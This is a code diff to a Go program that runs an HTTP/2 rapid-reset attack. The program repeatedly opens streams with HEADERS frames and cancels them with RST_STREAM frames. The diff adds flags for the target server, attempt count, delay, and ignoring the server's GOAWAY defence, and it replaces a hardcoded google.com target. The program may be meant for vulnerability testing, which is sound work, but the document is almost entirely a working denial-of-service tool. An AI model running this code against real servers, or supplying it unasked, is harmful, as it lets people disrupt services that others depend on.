@@ -5,12 +5,20 @@ import (
 	"crypto/tls"
 	"log"
 	"net/url"
+	"time"
+	"flag"
 
 	"golang.org/x/net/http2"
 	"golang.org/x/net/http2/hpack"
 )
 
 const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
+
+var attempts = flag.Uint("a", 1, "maximum attempts per routine")
+var sleep = flag.Int("d", 1, "delay between sending HEADERS and RST_STREAM frames")
+var ignoreGoAway = flag.Bool("i", false, "ignore GOAWAY frames sent by the server")
+var serverUrl = flag.String("u", "https://localhost:443/", "the server to attack")
+var skipVerify = flag.Bool("s", true, "skip certificate verifcation")
 
 func createHeaderFrameParam(url *url.URL, streamId uint32) http2.HeadersFrameParam {
 	var headerBlock bytes.Buffer
@@ -32,16 +40,16 @@ func createHeaderFrameParam(url *url.URL, streamId uint32) http2.HeadersFramePar
 }
 
 func main() {
-	serverUrl, err := url.Parse("https://www.google.com:443/")
+	flag.Parse()
+	serverUrl, err := url.Parse(*serverUrl)
 	if err != nil {
 		log.Fatalf("invalid server url: %v", err)
 	}
 
 	connections := 1
-	skipVerify := true
 
 	conf := &tls.Config{
-		InsecureSkipVerify: skipVerify,
+		InsecureSkipVerify: *skipVerify,
 		NextProtos:         []string{"h2"},
 	}
 
@@ -82,24 +90,33 @@ func main() {
 
 		//at this point, the connection is established.
 
-		attack(framer, serverUrl)
+		attack(framer, serverUrl, *attempts)
 		conn.Close()
 	}
 }
 
 const streamId uint32 = 1
 
-func attack(framer *http2.Framer, url *url.URL) {
+func attack(framer *http2.Framer, url *url.URL, attempts uint) {
 	framer.WriteHeaders(createHeaderFrameParam(url, streamId))
+	var i uint = 0
 	for {
 		frame, err := framer.ReadFrame()
 		if err != nil {
 			log.Fatalf("error reading response frame: %v", err)
 		}
 		log.Printf("found new frame headers: %v", frame.Header())
-
+		
 		if frame.Header().Type == http2.FrameHeaders {
+			i++
+			if i > attempts {
+				break
+			}
+
 			log.Println("received HEADERS, now sending RST Frame...")
+		
+			time.Sleep(time.Millisecond * time.Duration(*sleep))
+			
 			err = framer.WriteRSTStream(streamId, http2.ErrCodeCancel)
 			if err != nil {
 				log.Fatalf("failed sending RST STREAM frame: %v", err)
@@ -112,7 +129,7 @@ func attack(framer *http2.Framer, url *url.URL) {
 			}
 
 			log.Println("wrote new HEADERS frame to start a new request...")
-		} else if frame.Header().Type == http2.FrameGoAway {
+		} else if frame.Header().Type == http2.FrameGoAway && !*ignoreGoAway {
 			log.Printf("received GOAWAY. It seems like the server responded correctly.")
 			break
 		}
